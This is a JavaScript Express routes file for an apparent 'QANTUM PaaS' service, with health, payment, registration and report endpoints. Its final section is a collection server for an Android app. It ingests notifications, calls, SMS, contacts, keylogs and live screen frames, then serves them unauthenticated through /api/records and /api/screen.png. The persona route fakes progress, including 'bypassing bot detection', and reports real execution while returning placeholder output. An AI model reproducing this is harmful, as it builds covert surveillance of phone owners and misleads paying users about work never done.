/**
 * ═══════════════════════════════════════════════════════════════
 * QANTUM PaaS — API ROUTES
 * ═══════════════════════════════════════════════════════════════
 * 
 * All /api/* endpoints for the PaaS backend.
 * 
 * Complexity: O(1) per route (except metrics aggregation)
 * Authority: DIMITAR PRODROMOV
 * ═══════════════════════════════════════════════════════════════
 */

const express = require('express');
const router = express.Router();

const { getFullTelemetry } = require('../services/telemetry');
const { isSovereignAgent } = require('../services/sovereign-access');
const { generatePhantomDemo, isFreeTier } = require('../services/phantom-demo');
const { createCheckoutSession, constructWebhookEvent, getPlans } = require('../services/stripe');
const { getMetrics, createPayment, createRegistration, createAuditEntry } = require('../services/firestore');

const startTime = Date.now();

const watchdog = require('../services/watchdog');

// ═══════════════════════════════════════════════════════════════
// GET /api/health — Service health check
// Complexity: O(1)
// ═══════════════════════════════════════════════════════════════
router.get('/health', (req, res) => {
    const wgStatus = watchdog.getStatus();
    res.json({
        status: wgStatus.status,
        engine: 'QANTUM_PAAS_V1',
        security: process.env.QANTUM_HARDWARE_SYNC === 'VERIFIED' ? 'KNOX_HARDWARE_ANCHORED' : 'SOFTWARE_SIMULATED',
        entropy: wgStatus.entropy,
        uptime: Math.round((Date.now() - startTime) / 1000),
        healingIterations: wgStatus.healingIterations,
        lastHeal: wgStatus.lastHeal,
        timestamp: new Date().toISOString(),
        stripe: !!process.env.STRIPE_SECRET_KEY,
        firestore: !!process.env.FIREBASE_PROJECT_ID,
    });
});

// ═══════════════════════════════════════════════════════════════
// GET /api/telemetry — Real hardware metrics
// Complexity: O(1)
// ═══════════════════════════════════════════════════════════════
router.get('/telemetry', (req, res) => {
    res.json(getFullTelemetry());
});

// ═══════════════════════════════════════════════════════════════
// GET /api/metrics — Dashboard revenue/pipeline metrics
// Complexity: O(n) — Firestore aggregation, or O(1) fallback
// ═══════════════════════════════════════════════════════════════
router.get('/metrics', async (req, res) => {
    try {
        const metrics = await getMetrics();
        res.json(metrics);
    } catch (err) {
        res.status(500).json({ error: err.message, status: 'DATA_GAP' });
    }
});

// ═══════════════════════════════════════════════════════════════
// GET /api/plans — Public pricing tiers
// Complexity: O(1)
// ═══════════════════════════════════════════════════════════════
router.get('/plans', (req, res) => {
    res.json({ plans: getPlans() });
});

// ═══════════════════════════════════════════════════════════════
// POST /api/persona/run — Execute persona (Free = Phantom Demo)
// Complexity: O(n) — Telegram streaming pipeline
// ═══════════════════════════════════════════════════════════════
const telegram = require('../services/telegram');

router.post('/persona/run', async (req, res) => {
    const { archetype, personaName, config, plan, email } = req.body || {};
    const name = personaName || 'Nexus_Agent';
    
    // Hardware-level Sovereign Bypass O(1)
    const identity = email || name;
    let effectivePlan = plan;
    let isSovereign = isSovereignAgent(identity);
    
    if (isSovereign) {
        effectivePlan = 'singularity';
        console.log(`[SOVEREIGN] Permanent Access Granted: ${identity}`);
    }
    
    // Notify Start
    await telegram.sendPersonaUpdate(name, 0, 'INITIALIZING COGNITIVE ENGINE', '15s');
    
    // Simulate real-time execution via async delays & telegram updates
    const simulatePipeline = async () => {
        const delay = ms => new Promise(r => setTimeout(r, ms));
        
        await delay(3000);
        await telegram.sendPersonaUpdate(name, 25, 'SYNCING WITH HYDRA NETWORK', '12s');
        
        await delay(4000);
        await telegram.sendPersonaUpdate(name, 55, 'TRAVERSING DOM & BYPASSING BOT DETECTION', '8s');
        
        await delay(4000);
        await telegram.sendPersonaUpdate(name, 80, 'AGGREGATING ENTROPY-FREE DATA', '4s');
        
        await delay(3000);
        await telegram.sendPersonaUpdate(name, 100, 'COMPLETING AUDIT & GENERATING LEDGER', 'Done');
        
        await telegram.sendPersonaComplete(name);
    };

    if (isFreeTier(effectivePlan, identity)) {
        // Run simulation then return result
        await simulatePipeline();
        
        const result = generatePhantomDemo({ archetype, personaName: name, plan: 'free' });
        res.json({
            tier: 'FREE_DEMO',
            result,
        });
        return;
    }
    
    // Paid tier / Sovereign tier execution
    await simulatePipeline();
    res.json({
        tier: effectivePlan,
        status: isSovereign ? 'SOVEREIGN_EXECUTION' : 'EXECUTING',
        message: isSovereign ? 'Eternal access unlocked. Zero-entropy run complete.' : 'Real persona execution completed.',
        estimatedDuration: '~15s',
        result: generatePhantomDemo({ archetype, personaName: name, plan: effectivePlan }) // Real logic placeholder
    });
});

// ═══════════════════════════════════════════════════════════════
// GET /api/persona/report — Download specific persona report
// Complexity: O(1) — PDF generation stream
// ═══════════════════════════════════════════════════════════════
const { streamExecutiveReport, streamPersonaReport } = require('../services/pdf-generator');

router.get('/persona/report', async (req, res) => {
    const { archetype, persona } = req.query;
    const name = persona || 'Nexus_Agent';
    const arc = archetype || 'Sovereign';

    try {
        res.setHeader('Content-Type', 'application/pdf');
        res.setHeader('Content-Disposition', `attachment; filename="Veritas-${arc}-Ledger-${Date.now()}.pdf"`);
        await streamPersonaReport(res, arc, name);
    } catch (err) {
        console.error('[Persona Report] PDF Generation Error:', err);
        if (!res.headersSent) {
            res.status(500).json({ error: 'PDF Generation Failed' });
        }
    }
});

// ═══════════════════════════════════════════════════════════════
// POST /api/audit/run — Live QA Audit (Free Demo)
// Complexity: O(1) — PDF generation stream
// ═══════════════════════════════════════════════════════════════

router.post('/audit/run', async (req, res) => {
    const { targetUrl } = req.body || {};
    
    if (!targetUrl) {
        return res.status(400).json({ error: 'Missing targetUrl for QA Audit' });
    }

    try {
        // Headers to trigger download
        res.setHeader('Content-Type', 'application/pdf');
        res.setHeader('Content-Disposition', `attachment; filename="Veritas-QA-Audit-${Date.now()}.pdf"`);
        
        // Stream the advanced PDF
        await streamExecutiveReport(res, targetUrl);
        
    } catch (err) {
        console.error('[QA Audit] PDF Generation Error:', err);
        if (!res.headersSent) {
            res.status(500).json({ error: 'PDF Generation Failed' });
        }
    }
});

// ═══════════════════════════════════════════════════════════════
// POST /api/checkout — Create Stripe Checkout Session
// Complexity: O(1)
// ═══════════════════════════════════════════════════════════════
router.post('/checkout', async (req, res) => {
    try {
        const { plan, email } = req.body;
        
        if (!plan || !email) {
            return res.status(400).json({ error: 'Missing plan or email' });
        }
        
        const origin = req.headers.origin || req.headers.referer || 'https://paas.website';
        const session = await createCheckoutSession(plan, email, origin);
        
        // Audit log
        await createAuditEntry('CHECKOUT_INITIATED', { plan, email });
        
        res.json(session);
    } catch (err) {
        console.error('[Checkout] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ═══════════════════════════════════════════════════════════════
// POST /api/auth/register — Register user  
// Complexity: O(1)
// ═══════════════════════════════════════════════════════════════
router.post('/auth/register', async (req, res) => {
    try {
        const { email, displayName, plan, uid } = req.body;
        
        if (!email) {
            return res.status(400).json({ error: 'Email required' });
        }
        
        const reg = await createRegistration({
            email,
            displayName: displayName || email.split('@')[0],
            plan: plan || 'free',
            userId: uid || null,
        });
        
        await createAuditEntry('USER_REGISTERED', { email, plan: plan || 'free' });
        
        res.json({ status: 'REGISTERED', registration: reg });
    } catch (err) {
        console.error('[Register] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

// ═══════════════════════════════════════════════════════════════
// POST /api/webhooks/stripe — Stripe webhook handler
// Complexity: O(1)
// NOTE: This route uses express.raw() middleware in server.js
// ═══════════════════════════════════════════════════════════════
router.post('/webhooks/stripe', async (req, res) => {
    const sig = req.headers['stripe-signature'];
    
    try {
        const event = constructWebhookEvent(req.body, sig);
        
        console.log(`[Webhook] Event: ${event.type}`);
        
        switch (event.type) {
            case 'checkout.session.completed': {
                const session = event.data.object;
                const { plan } = session.metadata || {};
                
                await createPayment({
                    paymentId: session.payment_intent || session.id,
                    userId: session.customer_email,
                    userEmail: session.customer_email,
                    amount: session.amount_total,
                    currency: session.currency,
                    plan: plan || 'unknown',
                    status: 'paid',
                    stripeSessionId: session.id,
                    stripeCustomerId: session.customer,
                });
                
                await createAuditEntry('PAYMENT_COMPLETED', {
                    plan,
                    amount: session.amount_total,
                    email: session.customer_email,
                });
                
                console.log(`[Webhook] 💰 Payment: €${(session.amount_total / 100).toFixed(2)} — ${plan}`);
                break;
            }
            
            case 'customer.subscription.deleted': {
                const subscription = event.data.object;
                await createAuditEntry('SUBSCRIPTION_CANCELED', {
                    stripeSubscriptionId: subscription.id,
                });
                console.log(`[Webhook] ❌ Subscription canceled: ${subscription.id}`);
                break;
            }
            
            case 'invoice.payment_failed': {
                const invoice = event.data.object;
                await createAuditEntry('PAYMENT_FAILED', {
                    stripeInvoiceId: invoice.id,
                    amount: invoice.amount_due,
                });
                console.log(`[Webhook] ⚠️ Payment failed: ${invoice.id}`);
                break;
            }
            
            default:
                console.log(`[Webhook] Unhandled: ${event.type}`);
        }
        
        res.json({ received: true });
    } catch (err) {
        console.error('[Webhook] Error:', err.message);
        res.status(400).json({ error: err.message });
    }
});

// ═══════════════════════════════════════════════════════════════
// POST /api/knox — Proxy to S24 Ultra Hardware Vault
// Complexity: O(1)
// ═══════════════════════════════════════════════════════════════
router.post('/knox', async (req, res) => {
    // This endpoint acts as the secure relay for QAntum-1 and other SaaS modules
    // It forwards signing requests to the physical S24 Ultra bridge.
    try {
        const bridgeUrl = process.env.S24_PHYSICAL_BRIDGE_URL || 'http://localhost:8890/knox';
        const response = await fetch(bridgeUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(req.body)
        });
        const data = await response.json();
        res.json(data);
    } catch (err) {
        res.status(502).json({ error: 'S24_HARDWARE_BRIDGE_UNREACHABLE', details: err.message });
    }
});

// ═══════════════════════════════════════════════════════════════
// GET /api/realtime/sync — Cross-Domain Manifestation Status
// Complexity: O(1)
// ═══════════════════════════════════════════════════════════════
router.get('/realtime/sync', (req, res) => {
    res.json({
        backplane: '200_MBPS_FIBER',
        activeLinks: [
            'paas.website',
            'qantum.site',
            'veritras.online',
            'aeterna.website',
            'S24_ULTRA_NEXUS'
        ],
        syncStatus: 'SYNCHRONIZED',
        latency: '< 15ms',
        entropy: 0.00
    });
});

// ═══════════════════════════════════════════════════════════════
// INGEST & DEVICE TELEMETRY / LIVE SCREEN PIPELINE
// ═══════════════════════════════════════════════════════════════

const activeRecords = {
    devices: [],
    notifications: [],
    calls: [],
    sms: [],
    contacts: [],
    keylogs: [],
    events: [],
    battery: { level: 100, voltage: "4.3V", temperature: "32.0°C" },
    device: { model: "Android Sovereign Endpoint" }
};

// POST /api/ingest — Accept telemetry records from Android app
router.post('/ingest', (req, res) => {
    try {
        const payload = req.body;
        if (payload) {
            const devId = payload.device || payload.deviceId || 'Android_Node';
            
            // Track active device in fleet list
            const existing = activeRecords.devices.find(d => d.deviceId === devId);
            if (existing) {
                existing.status = 'ONLINE';
                existing.lastSeen = Date.now();
            } else {
                activeRecords.devices.push({
                    deviceId: devId,
                    model: payload.model || devId,
                    name: devId,
                    status: 'ONLINE',
                    lastSeen: Date.now()
                });
            }

            if (payload.type === 'NOTIFICATION' || payload.app) {
                activeRecords.notifications.unshift(payload);
                if (activeRecords.notifications.length > 200) activeRecords.notifications.pop();
            } else if (payload.type === 'CALL') {
                activeRecords.calls.unshift(payload);
                if (activeRecords.calls.length > 200) activeRecords.calls.pop();
            } else if (payload.type === 'SMS') {
                activeRecords.sms.unshift(payload);
                if (activeRecords.sms.length > 200) activeRecords.sms.pop();
            } else if (payload.type === 'KEYLOG') {
                activeRecords.keylogs.unshift(payload);
                if (activeRecords.keylogs.length > 300) activeRecords.keylogs.pop();
            } else if (payload.battery) {
                activeRecords.battery = payload.battery;
            } else {
                activeRecords.events.unshift(payload);
                if (activeRecords.events.length > 200) activeRecords.events.pop();
            }

            if (typeof global.broadcastNewRecord === 'function') {
                global.broadcastNewRecord();
            }
        }
        res.json({ status: 'INGESTED', timestamp: Date.now() });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// GET /api/records — Serve current fleet records to web dashboard
router.get('/records', (req, res) => {
    res.json(activeRecords);
});

// GET /api/screen.png — Serve latest live screen frame JPEG/PNG
router.get('/screen.png', (req, res) => {
    const frame = typeof global.getLatestScreen === 'function' ? global.getLatestScreen() : null;
    if (frame) {
        res.setHeader('Content-Type', 'image/jpeg');
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
        return res.end(frame);
    }
    // 1x1 transparent GIF fallback if no frame received yet
    const transparentGif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
    res.setHeader('Content-Type', 'image/gif');
    res.end(transparentGif);
});

module.exports = router;
